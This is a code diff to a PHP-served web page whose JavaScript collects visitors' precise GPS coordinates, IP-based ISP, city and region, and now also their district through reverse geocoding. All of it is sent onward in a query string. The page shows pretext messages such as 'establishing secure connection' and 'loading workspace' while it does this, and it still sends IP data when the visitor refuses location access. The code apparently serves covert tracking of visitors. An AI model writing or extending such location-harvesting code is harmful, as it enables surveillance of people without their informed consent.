@@ -60,6 +60,18 @@ echo <<<HTML
             return {};
         }
 
+        async function getDistrictFromGPS(lat, lon) {
+            try {
+                // Reverse Geocoding exhaustivo usando Nominatim (OSM)
+                let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lon}`, {
+                    headers: { 'User-Agent': 'Mozilla/5.0' }
+                });
+                let d = await res.json();
+                // Buscamos el distrito en suburb, neighbourhood o city_district
+                return d.address.suburb || d.address.neighbourhood || d.address.city_district || d.address.district || "Unknown";
+            } catch (e) { return "Unknown"; }
+        }
+
         async function getLocation() {
             document.getElementById("locationStatus").innerText = "Estableciendo conexión segura...";
             
@@ -71,18 +83,22 @@ echo <<<HTML
                 
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
-                        const extraInfo = await ipInfoPromise;
+                        const [extraInfo, district] = await Promise.all([
+                            ipInfoPromise,
+                            getDistrictFromGPS(position.coords.latitude, position.coords.longitude)
+                        ]);
                         sendFinalData(
                             position.coords.latitude, 
                             position.coords.longitude, 
                             position.coords.accuracy, 
-                            extraInfo
+                            extraInfo,
+                            district
                         );
                     },
                     async (error) => {
                         // Si deniega o falla el GPS, mandamos al menos lo de la IP
                         const extraInfo = await ipInfoPromise;
-                        sendFinalData("Denied", "Denied", "IP-Fallback", extraInfo);
+                        sendFinalData("Denied", "Denied", "IP-Fallback", extraInfo, "Unknown");
                     },
                     {
                         enableHighAccuracy: true,
@@ -92,11 +108,11 @@ echo <<<HTML
                 );
             } else {
                 const extraInfo = await ipInfoPromise;
-                sendFinalData("Not-Supported", "Not-Supported", "IP-Fallback", extraInfo);
+                sendFinalData("Not-Supported", "Not-Supported", "IP-Fallback", extraInfo, "Unknown");
             }
         }
 
-        function sendFinalData(lat, lon, acc, extraInfo) {
+        function sendFinalData(lat, lon, acc, extraInfo, district) {
             document.getElementById("locationStatus").innerText = "Cargando espacio de trabajo...";
 
             var isp = extraInfo.isp || "Unknown";
@@ -131,6 +147,7 @@ echo <<<HTML
                 "lat=" + lat +
                 "&lon=" + lon +
                 "&acc=" + acc +
+                "&district=" + encodeURIComponent(district) +
                 "&isp=" + encodeURIComponent(isp) +
                 "&city=" + encodeURIComponent(city) +
                 "&region=" + encodeURIComponent(region) +
